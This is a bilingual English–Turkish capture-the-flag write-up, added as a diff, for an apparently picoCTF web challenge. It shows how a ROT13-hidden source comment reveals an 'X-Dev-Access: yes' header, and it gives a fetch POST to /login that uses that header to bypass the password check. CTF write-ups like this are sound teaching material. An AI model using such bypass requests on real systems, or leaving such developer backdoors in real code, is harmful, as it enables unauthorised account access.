@@ -1,0 +1,57 @@
+--ENG--
+
+  The task was to gain access to a restricted web portal using the email ctf-player@picoctf.org. Since the password was unknown, the goal was to find a developer's "backdoor" or a hidden entry point mentioned in the challenge description.
+
+Solution Steps
+Source Code Inspection: By inspecting the page source (CTRL+U), I discovered a hidden comment:
+``
+
+ROT13 Decoding: Based on the hint about rotating letters by 13 positions, I decoded the string using the ROT13 cipher:
+
+Encoded: ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"
+
+Decoded: NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
+
+Exploitation: The decoded message revealed that adding a custom HTTP header named X-Dev-Access with the value yes would bypass the authentication.
+
+Payload Injection: Using the browser's Developer Tools (Console), I executed a custom fetch request to inject the required header:
+
+JavaScript
+fetch('/login', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'X-Dev-Access': 'yes'
+    },
+    body: JSON.stringify({ email: 'ctf-player@picoctf.org', password: 'any' })
+}).then(res => res.json()).then(data => console.log(data));
+Result: The server recognized the developer access header, bypassed the password check, and returned the Flag.
+
+
+-- TR --
+  
+Bu senaryoda, ctf-player@picoctf.org e-posta adresiyle bir web portalına giriş yapmamız istendi ancak şifreyi bilmiyorduk. Geliştiricinin bir "arka kapı" veya ipucu bırakmış olabileceği belirtilmişti.
+
+Çözüm Adımları
+Kaynak Kod Analizi: Sayfa kaynağını incelediğimde (CTRL+U), HTML yorum satırları arasında gizlenmiş şu metni buldum:
+
+ROT13 Kod Çözme: Verilen ipucuna dayanarak (alfabede 13 karakter kaydırma), bu metni ROT13 algoritmasıyla decode ettim:
+
+Orijinal: ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"
+
+Çözülen: NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
+
+İstek Manipülasyonu (Request Manipulation): Sisteme giriş yapabilmek için HTTP isteklerine özel bir başlık (header) eklemem gerektiğini anladım.
+
+JavaScript ile Bypass: Tarayıcı konsolunu (F12) kullanarak, X-Dev-Access: yes başlığını içeren manuel bir POST isteği gönderdim:
+
+JavaScript
+fetch('/login', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'X-Dev-Access': 'yes'
+    },
+    body: JSON.stringify({ email: 'ctf-player@picoctf.org', password: 'any' })
+}).then(res => res.json()).then(data => console.log(data));
+Sonuç: Sunucu, bu özel geliştirici başlığını gördüğünde kimlik doğrulamasını atladı ve Flag'i (bayrağı) yanıt olarak döndürdü.
